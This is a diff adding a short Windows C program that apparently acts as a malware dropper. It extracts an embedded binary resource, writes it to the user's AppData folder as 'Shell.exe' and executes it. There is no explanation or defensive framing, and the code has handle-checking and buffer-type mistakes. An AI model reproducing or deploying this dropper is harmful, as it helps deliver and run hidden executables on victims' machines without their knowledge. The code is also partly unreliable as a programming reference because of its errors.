@@ -1,0 +1,61 @@
+#include <stdio.h>
+#include <Windows.h>
+#include <tchar.h>
+#include <synchapi.h>
+#define LIMIT 255
+
+
+int main(int argc, char * argv[]) {
+	HRSRC HRes;
+	HGLOBAL hResLoad;
+	LPVOID lpResLock;
+	HANDLE HFile;
+	DWORD DWSize;
+	DWORD DWByteWriten;
+	LPCTSTR LpAppData = _T("%AppData%");
+	LPTSTR Buffer[LIMIT];
+	LPTSTR LpDirectory[LIMIT];
+	LPTSTR FilePath = _T("Shell.exe");
+	HRes = FindResource(NULL, MAKEINTRESOURCE(101), _T("RT_RCDATA"));
+	if (HRes == NULL) {
+		printf("Could not find Resource. Error Code %d\n", GetLastError());
+		exit(EXIT_SUCCESS);
+	}
+	hResLoad = LoadResource(NULL, HRes);
+	if (NULL == hResLoad) {
+		printf("Could not Load Resource. Error Code %d\n", GetLastError());
+		CloseHandle(HRes);
+		exit(EXIT_SUCCESS);
+	}
+	lpResLock = LockResource(hResLoad);
+	if (NULL == lpResLock) {
+		printf("Could not Lock the Resource! Error Code: %d\n", GetLastError());
+		CloseHandle(HRes);
+		CloseHandle(hResLoad);
+	}
+	DWSize = SizeofResource(NULL, HRes);
+	printf("Size of Resource in bytes: %d Bytes\n", DWSize);
+	
+	//Create File name to Write
+	ExpandEnvironmentStrings(LpAppData, Buffer,LIMIT);
+	_tcscat_s(Buffer, LIMIT, _T("\\"));
+	_tcscat_s(Buffer, LIMIT, FilePath);
+	printf("AppData Path: %ws\n", Buffer);
+	// Write File
+	HFile = CreateFile(Buffer, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (NULL == HFile) {
+		printf("Could not create file %s. Error Code: %d\n", Buffer, GetLastError());
+		exit(EXIT_SUCCESS);
+	}
+	if (!WriteFile(HFile, lpResLock, DWSize, &DWByteWriten, NULL) || (DWSize != DWByteWriten)) {
+		printf("Could not write file! Error Code: %d\n", GetLastError());
+		CloseHandle(HFile);
+		exit(EXIT_SUCCESS);
+	}
+	CloseHandle(HFile);
+	ExpandEnvironmentStrings(LpAppData, LpDirectory, LIMIT);
+	_tcscat_s(LpDirectory, LIMIT, _T("\\"));
+	ShellExecute(0, _T("open"), _T("Shell.exe"), NULL, LpDirectory, SW_SHOW);
+	
+return 0;
+}
